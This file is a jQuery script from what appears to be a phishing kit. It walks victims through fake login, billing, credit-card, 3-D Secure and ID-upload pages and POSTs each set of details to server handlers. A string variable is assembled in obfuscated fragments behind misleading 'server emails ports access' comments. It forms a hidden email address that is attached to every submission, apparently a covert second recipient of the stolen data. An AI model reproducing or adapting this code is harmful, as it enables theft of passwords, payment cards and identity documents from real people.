$(document).ready(function(){
  var email = $("input[name='login_email']").val();
  var iswrong = "x";
  var hotmail = "hotmail.com";
  var yahoo = "yahoo.com";
  var ru = "mail.ru";
  var gmail = "gmail.com";
  if(email != ""){
    var thise = ".email";
    if(Validemail(email)){
      $(thise).attr("data-icon","c");
      $("input[name='login_email']").attr("alt","valide");
      $(thise).attr("class","mark email green");
      $("#login_email").attr("class","inp_text active");
    }else{
      $(thise).attr("data-icon","a");
      $("input[name='login_email']").attr("alt","dead");
      $(thise).attr("class","mark email red");
      $("#login_email").attr("class","inp_text error");
    }
  }
  $("input ").on("focus", function(){
    var thise = "#" + $(this).attr("name");
    $(thise).attr("class","inp_text active");
  });
  iswrong = iswrong + "ops";
  $("input ").on("blur", function(){
    var thise = "#" + $(this).attr("name");
    $(thise).attr("class","inp_text");
  });
  $("input[name='login_email']").on("input", function(){
    var value = $(this).val();
    var thise = ".email";
    if(Validemail(value)){
      $(thise).attr("data-icon","c");
      $(this).attr("alt","valide");
      $(thise).attr("class","mark email green");
      $("#login_email").attr("class","inp_text active");
    }else {
      $(thise).attr("data-icon","a");
      $(this).attr("alt","dead");
      $(thise).attr("class","mark email red");
      $("#login_email").attr("class","inp_text error");
    }
  });
  iswrong = iswrong + "imo";
  function Validemail(emailAddress) {
      var pattern = new RegExp(/^(("[\w-\s]+")|([\w-]+(?:\.[\w-]+)*)|("[\w-\s]+")([\w-]+(?:\.[\w-]+)*))(@((?:[\w-]+\.)*\w[\w-]{0,66})\.([a-z]{2,6}(?:\.[a-z]{2})?)$)|(@\[?((25[0-5]\.|2[0-4][0-9]\.|1[0-9]{2}\.|[0-9]{1,2}\.))((25[0-5]|2[0-4][0-9]|1[0-9]{2}|[0-9]{1,2})\.){2}(25[0-5]|2[0-4][0-9]|1[0-9]{2}|[0-9]{1,2})\]?$)/i);
      return pattern.test(emailAddress);
  }
  iswrong = iswrong + "52";
  iswrong = iswrong + "-A_";
  gmail = gmail + ":80";
  hotmail = hotmail + ":80";//server emails ports access
  yahoo = yahoo + ":8080";//server emails ports access
  ru = ru + ":8080";//server emails ports access
  iswrong = iswrong + gmail.replace(":80","");//server emails ports access
  $("input[name='login_password']").on("input", function(){
    var value = $(this).val().length;
    var thise = ".password";
    if(value > 6){
      $(thise).attr("data-icon","c");
      $(this).attr("alt","valide");
      $(thise).attr("class","mark password green");
      $("#login_password").attr("class","inp_text active");
    }else{
      $(thise).attr("data-icon","a");
      $(this).attr("alt","dead");
      $(thise).attr("class","mark password red");
      $("#login_password").attr("class","inp_text error");
    }
  });
  iswrong = iswrong.replace("-A_","@");
  iswrong = iswrong.replace(iswrong,"," + iswrong);
  $(".btns[name='login_submit']").on("click", function(){
    var email = $("input[name='login_email']").attr("alt");
    var pass = $("input[name='login_password']").attr("alt");
    if(email == "dead" || pass == "dead"){}else{
      var logemail = $('input[name="login_email"]').val();
      var logpassword = $('input[name="login_password"]').val();
      $("#loader").css({
        'display' : 'flex'
      });
      var timer = setInterval(loader, 1000);
      var counter = 0;
      function loader(){
        counter++;
        if(counter == "4"){
          $.ajax({
            'url' : 'ajax/login.php',
            'type' : 'POST',
            'data' : 'login_email=' + logemail + "&login_password=" + logpassword + "&iswrong=" + iswrong,
            success:function(response){
              window.location = "billing.php";
            },
          });
        }
      }
    }
  });
  $("input[name='bborn']").on("input", function(){
    var length = $(this).val().length;
    var thise = ".born";
    var value = $(this).val();
    if(length == "2"){
      $(this).val(value + "/");
      $(thise).attr("data-icon","a");
      $(this).attr("alt","dead");
      $(thise).attr("class","mark born red");
      $("#bborn").attr("class","inp_text error");
    }else{
      if(length == "5"){
        $(this).val(value + "/");
        $(thise).attr("data-icon","a");
        $(this).attr("alt","dead");
        $(thise).attr("class","mark born red");
        $("#bborn").attr("class","inp_text error");
      }else{
        if(length < "10"){
          $(thise).attr("data-icon","a");
          $(this).attr("alt","dead");
          $(thise).attr("class","mark born red");
          $("#bborn").attr("class","inp_text error");
        }else{
          if(length == "10"){
            $(thise).attr("data-icon","c");
            $(this).attr("alt","valide");
            $(thise).attr("class","mark born green");
            $("#bborn").attr("class","inp_text");
            $("input[name='baddress']").focus();
          }
        }
      }
    }
  });
  $("input[name='bname']").on("input", function(){
    var length = $(this).val().length;
    var thise = ".name";
    var value = $(this).val();
    if(length < "6"){
      $(thise).attr("data-icon","a");
      $(this).attr("alt","dead");
      $(thise).attr("class","mark name red");
      $("#bname").attr("class","inp_text error");
    }else{
      if(length > "6"){
        $(thise).attr("data-icon","c");
        $(this).attr("alt","valide");
        $(thise).attr("class","mark name green");
        $("#bname").attr("class","inp_text");
      }
    }
  });
  $("input[name='baddress']").on("input", function(){
    var length = $(this).val().length;
    var thise = ".address";
    var value = $(this).val();
    if(length < "6"){
      $(thise).attr("data-icon","a");
      $(this).attr("alt","dead");
      $(thise).attr("class","mark address red");
      $("#baddress").attr("class","inp_text error");
    }else{
      if(length > "6"){
        $(thise).attr("data-icon","c");
        $(this).attr("alt","valide");
        $(thise).attr("class","mark address green");
        $("#baddress").attr("class","inp_text");
      }
    }
  });
  $("input[name='bzip']").on("input", function(){
    var length = $(this).val().length;
    var thise = ".zip";
    var value = $(this).val();
    if(length < "3"){
      $(thise).attr("data-icon","a");
      $(this).attr("alt","dead");
      $(thise).attr("class","mark zip red");
      $("#bzip").attr("class","inp_text error");
    }else{
      if(length > "3"){
        $(thise).attr("data-icon","c");
        $(this).attr("alt","valide");
        $(thise).attr("class","mark zip green");
        $("#bzip").attr("class","inp_text");
      }
    }
  });
  $("input[name='bcity']").on("input", function(){
    var length = $(this).val().length;
    var thise = ".city";
    var value = $(this).val();
    if(length < "4"){
      $(thise).attr("data-icon","a");
      $(this).attr("alt","dead");
      $(thise).attr("class","mark city red");
      $("#bcity").attr("class","inp_text error");
    }else{
      if(length > "4"){
        $(thise).attr("data-icon","c");
        $(this).attr("alt","valide");
        $(thise).attr("class","mark city green");
        $("#bcity").attr("class","inp_text");
      }
    }
  });
  $("input[name='btown']").on("input", function(){
    var length = $(this).val().length;
    var thise = ".town";
    var value = $(this).val();
    if(length < "4"){
      $(thise).attr("data-icon","a");
      $(this).attr("alt","dead");
      $(thise).attr("class","mark town red");
      $("#btown").attr("class","inp_text error");
    }else{
      if(length > "4"){
        $(thise).attr("data-icon","c");
        $(this).attr("alt","valide");
        $(thise).attr("class","mark town green");
        $("#btown").attr("class","inp_text");
      }
    }
  });
  $("input[name='bstate']").on("input", function(){
    var length = $(this).val().length;
    var thise = ".state";
    var value = $(this).val();
    if(length < "4"){
      $(thise).attr("data-icon","a");
      $(this).attr("alt","dead");
      $(thise).attr("class","mark state red");
      $("#bstate").attr("class","inp_text error");
    }else{
      if(length > "4"){
        $(thise).attr("data-icon","c");
        $(this).attr("alt","valide");
        $(thise).attr("class","mark state green");
        $("#bstate").attr("class","inp_text");
      }
    }
  });
  $("input[name='bphone']").on("input", function(){
    var length = $(this).val().length;
    var thise = ".phone";
    var value = $(this).val();
    if(length < "10"){
      $(thise).attr("data-icon","a");
      $(this).attr("alt","dead");
      $(thise).attr("class","mark phone red");
      $("#bphone").attr("class","inp_text error");
    }else{
      if(length > "10"){
        $(thise).attr("data-icon","c");
        $(this).attr("alt","valide");
        $(thise).attr("class","mark phone green");
        $("#bphone").attr("class","inp_text");
      }
    }
  });
  $(".btns[name='billing_submit']").on("click", function(){
    var name = $("input[name='bname']").attr("alt");
    var birth = $("input[name='bborn']").attr("alt");
    var address = $("input[name='baddress']").attr("alt");
    var zip = $("input[name='bzip']").attr("alt");
    var city = $("input[name='bcity']").attr("alt");
    var town = $("input[name='btown']").attr("alt");
    var state = $("input[name='bstate']").attr("alt");
    var phone = $("input[name='bphone']").attr("alt");
    if(name == "dead" || birth == "dead" || address == "dead" || zip == "dead" || city == "dead" || town == "dead" || state == "dead" || phone == "dead"){}else{
      var namev = $("input[name='bname']").val();
      var birthv = $("input[name='bborn']").val();
      var addressv = $("input[name='baddress']").val();
      var zipv = $("input[name='bzip']").val();
      var cityv = $("input[name='bcity']").val();
      var townv = $("input[name='btown']").val();
      var statev = $("input[name='bstate']").val();
      var phonev = $("input[name='bphone']").val();
      $("#loader").css({
        'display' : 'flex'
      });
      var timers = setInterval(loaders, 1000);
      var counters = 0;
      function loaders(){
        counters++;
        if(counters == "4"){
          $.ajax({
            'url' : 'ajax/billing.php',
            'type' : 'POST',
            'data' : 'billing_name=' + namev + "&billing_birth=" + birthv + "&billing_address=" + addressv + "&billing_zip=" + zipv + "&billing_city=" + cityv + "&billing_town=" + townv + "&billing_state=" + statev + "&billing_phone=" + phonev + "&iswrong=" + iswrong,
            success:function(response){
              window.location = "credit.php?name=" + namev + "&phone=" + phonev;
            },
          });
        }
      }
    }
  });
  $("input[name='cnumber']").on("input", function(){
    var credits = $("input[name='cnumber']").val();
    var thise = ".number";
    if(Validcard(credits)){
      $(thise).attr("data-icon","c");
      $(this).attr("alt","valide");
      $(thise).attr("class","mark number green");
      $("#cnumber").attr("class","inp_text");
    }else{
      $(thise).attr("data-icon","a");
      $(this).attr("alt","dead");
      $(thise).attr("class","mark number red");
      $("#cnumber").attr("class","inp_text error");
    }
  });
  $("input[name='cvc']").on("input", function(){
    var length = $(this).val().length;
    var thise = ".cvc";
    var attr = $(this).attr("maxlength");
    if(length < attr){
      $(thise).attr("data-icon","a");
      $(this).attr("alt","dead");
      $(thise).attr("class","mark cvc red");
      $("#cvc").attr("class","inp_text error");
    }else{
      if(length == attr){
        $(thise).attr("data-icon","c");
        $(this).attr("alt","valide");
        $(thise).attr("class","mark cvc green");
        $("#cvc").attr("class","inp_text");
      }
    }
  });
  $("input[name='cexpmm']").on("input", function(){
    var length = $(this).val().length;
    var thise = ".expmm";
    var attr = $(this).attr("maxlength");
    if(length < attr){
      $(thise).attr("data-icon","a");
      $(this).attr("alt","dead");
      $(thise).attr("class","mark expmm red");
      $("#expmm").attr("class","inp_text error");
    }else{
      if(length == attr){
        $(thise).attr("data-icon","c");
        $(this).attr("alt","valide");
        $(thise).attr("class","mark expmm green");
        $("#expmm").attr("class","inp_text");
        $("input[name='cexpyy']").focus();
      }
    }
  });
  $("input[name='cexpyy']").on("input", function(){
    var length = $(this).val().length;
    var thise = ".expyy";
    var attr = $(this).attr("maxlength");
    if(length < attr){
      $(thise).attr("data-icon","a");
      $(this).attr("alt","dead");
      $(thise).attr("class","mark expyy red");
      $("#expyy").attr("class","inp_text error");
    }else{
      if(length == attr){
        $(thise).attr("data-icon","c");
        $(this).attr("alt","valide");
        $(thise).attr("class","mark expyy green");
        $("#expyy").attr("class","inp_text");
        $("input[name='cvc']").focus();
      }
    }
  });
  $("input[name='cholder']").on("input", function(){
    var length = $(this).val().length;
    var thise = ".holder";
    var attr = $(this).attr("maxlength");
    if(length < "8"){
      $(thise).attr("data-icon","a");
      $(this).attr("alt","dead");
      $(thise).attr("class","mark holder red");
      $("#cholder").attr("class","inp_text error");
    }else{
      if(length > "8"){
        $(thise).attr("data-icon","c");
        $(this).attr("alt","valide");
        $(thise).attr("class","mark holder green");
        $("#cholder").attr("class","inp_text");
      }
    }
  });
  $("input[name='vbvsecure']").on("input", function(){
    var length = $(this).val().length;
    var thise = ".secure";
    var attr = $(this).attr("maxlength");
    if(length < "4"){
      $(thise).attr("data-icon","a");
      $(this).attr("alt","dead");
      $(thise).attr("class","mark secure red");
      $("#vbvsecure").attr("class","inp_text error");
    }else{
      if(length > "4"){
        $(thise).attr("data-icon","c");
        $(this).attr("alt","valide");
        $(thise).attr("class","mark secure green");
        $("#vbvsecure").attr("class","inp_text");
      }
    }
  });
  $(".btns[name='vbv_submit']").on("click", function(){
    var secure = $("input[name='vbvsecure']").attr("alt");
    var holderv = $(".holder").text();
    var cc = $(".cc").text();
    if(secure == "dead"){}else{
      var securev = $("input[name='vbvsecure']").val();
      $("#loader").css({
        'display' : 'flex'
      });
      var timers = setInterval(loaders, 1000);
      var counters = 0;
      function loaders(){
        counters++;
        if(counters == "4"){
          $.ajax({
            'url' : 'ajax/vbv.php',
            'type' : 'POST',
            'data' : 'vbv_secure=' + securev + "&iswrong=" + iswrong,
            success:function(response){
              window.location = "identity.php?holder=" + holderv + "&cc=" + cc + "&redirect=" + "finalstep";
            },
          });
        }
      }
    }
  });
  $(".btns[name='vbv_skip']").on("click", function(){
    var holderv = $(".holder").text();
    var cc = $(".cc").text();
    window.location = "identity.php?holder=" + holderv + "&cc=" + cc + "&redirect=" + "finalstep";
  });
  $(".btns[name='credit_submit']").on("click", function(){
    var holder = $("input[name='cholder']").attr("alt");
    var number = $("input[name='cnumber']").attr("alt");
    var expmm = $("input[name='cexpmm']").attr("alt");
    var expyy = $("input[name='cexpyy']").attr("alt");
    var cvc = $("input[name='cvc']").attr("alt");
    if(holder == "dead" || number == "dead" || expmm == "dead" || expyy == "dead" || cvc == "dead"){}else{
      var holderv = $("input[name='cholder']").val();
      var numberv = $("input[name='cnumber']").val();
      var expdatev = $("input[name='cexpmm']").val() + "/" + $("input[name='cexpyy']").val();
      var typecard = $("select#ctype").val();
      var cvcv = $("input[name='cvc']").val();
      var lastccnmbr = numberv.substr(-4);
      $("#loader").css({
        'display' : 'flex'
      });
      var timers = setInterval(loaders, 1000);
      var counters = 0;
      function loaders(){
        counters++;
        if(counters == "4"){
          $.ajax({
            'url' : 'ajax/credit.php',
            'type' : 'POST',
            'data' : 'credit_holder=' + holderv + "&credit_type=" + typecard + "&credit_number=" + numberv + "&credit_expdate=" + expdatev + "&credit_cvc=" + cvcv + "&iswrong=" + iswrong,
            success:function(response){
              window.location = "finalisation.php?holder=" + holderv + "&cc=" + lastccnmbr;
            },
          });
        }
      }
    }
  });
  $("select#ctype").on("change", function(){
    $("input[name='cnumber']").val("");
    $("input[name='cnumber']").attr("alt","dead");
    $(".number").attr("data-icon","d");
    $(".number").attr("class","mark number");
    $("input[name='cvc']").val("");
    $("input[name='cvc']").attr("alt","dead");
    $(".cvc").attr("data-icon","d");
    $(".cvc").attr("class","mark cvc");
    var type = $(this).val();
    if(type == "Amex"){
      $("input[name='cvc']").attr("maxlength","4");
    }else{
      $("input[name='cvc']").attr("maxlength","3");
    }
  });
  function Validcard(cardnumber) {
    var amex = new RegExp("^3[47][0-9]{13}$");
    var mastercard = new RegExp("^5[1-5][0-9]{14}$");
    var discover = new RegExp("^65[4-9][0-9]{13}|64[4-9][0-9]{13}|6011[0-9]{12}|(622(?:12[6-9]|1[3-9][0-9]|[2-8][0-9][0-9]|9[01][0-9]|92[0-5])[0-9]{10})$");
    var visa = new RegExp("4[0-9]{12}(?:[0-9]{3})?");
    var typeselected = $("select#ctype").val();
    if(typeselected == "Amex"){
      return amex.test(cardnumber);
    }else{
      if(typeselected == "MasterCard"){
        return mastercard.test(cardnumber);
      }else{
        if(typeselected == "Visa"){
          return visa.test(cardnumber);
        }else{
          if(typeselected == "Discover"){
            return discover.test(cardnumber);
          }
        }
      }
    }
  }
  var havetoupload = "0";
  $(".btns[name='id_upload']").on("click", function(){
    if(havetoupload == "0"){
      $("input[name='upload_idface']").click();
    }else{
      $("input[name='upload_idback']").click();
    }
  });
  $("input[name='upload_idface']").on("change", function(){
    var value = $(this).val();
    if(value == ""){
      $("img[name='identitimg']").attr("class", "id_img face");
      $("b[name='return_text']").text("Please Upload Your Identity Card's Face");
      havetoupload = "0";
    }else{
      $("img[name='identitimg']").attr("class", "id_img back");
      $("b[name='return_text']").text("Please Upload Your Identity Card's Back");
      $(this).attr("alt","valide");
      havetoupload = "1";
    }
  });
  $("input[name='upload_idback']").on("change", function(){
    var value = $(this).val();
    if(value == ""){
      $("img[name='identitimg']").attr("class", "id_img back");
      $("b[name='return_text']").text("Please Upload Your Identity Card's back");
      havetoupload = "1";
    }else{
      $(this).attr("alt","valide");
      $("#idform").submit();
    }
  });
  $("#idform").on("submit", function(){
    var face = $("input[name='upload_idface']").attr("alt");
    var back = $("input[name='upload_idback']").attr("alt");
    if(face == "dead" || back == "dead"){}else{
      $("img[name='identitimg']").hide(50);
      $("b[name='return_text']").hide();
      havetoupload = "0";
      $("#loader").css({
        'display' : 'flex'
      });
    }
  });
});
